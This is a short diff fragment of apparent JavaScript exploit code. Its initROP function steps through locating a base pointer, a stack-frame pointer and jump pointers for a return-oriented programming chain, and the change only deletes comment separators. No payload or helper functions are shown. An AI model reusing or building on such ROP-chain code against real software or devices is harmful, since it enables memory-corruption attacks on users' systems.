@@ -37,26 +37,17 @@ function initROP()
 		showFoundOffsets(offset_find_base_fp);
 		if((!base_found)&&(!stackframe_found)&&(!j2_found)&&(!j1_found)){base_found=findBase();}
 		showFoundOffsets(offset_find_base_fp);
-		// ==============================================================================
 		
-		
-		// ==============================================================================
 		// Find Stackframe Pointer
 		showFoundOffsets(offset_find_stack_frame);
 		if((base_found)&&(!stackframe_found)&&(!j2_found)&&(!j1_found)){stackframe_found=findStackFrame();}
 		showFoundOffsets(offset_find_stack_frame);
-		// ==============================================================================
 		
-		
-		// ==============================================================================
 		// Find Jump 2 Pointer
 		showFoundOffsets(offset_find_jump2);
 		if((base_found)&&(stackframe_found)&&(!j2_found)&&(!j1_found)){j2_found=findJump2();}
 		showFoundOffsets(offset_find_jump2);
-		// ==============================================================================
 		
-		
-		// ==============================================================================
 		// Find Jump 1 Pointer
 		showFoundOffsets(offset_find_jump1);
 		if((base_found)&&(stackframe_found)&&(j2_found)&&(!j1_found)){j1_found=findJump1();}
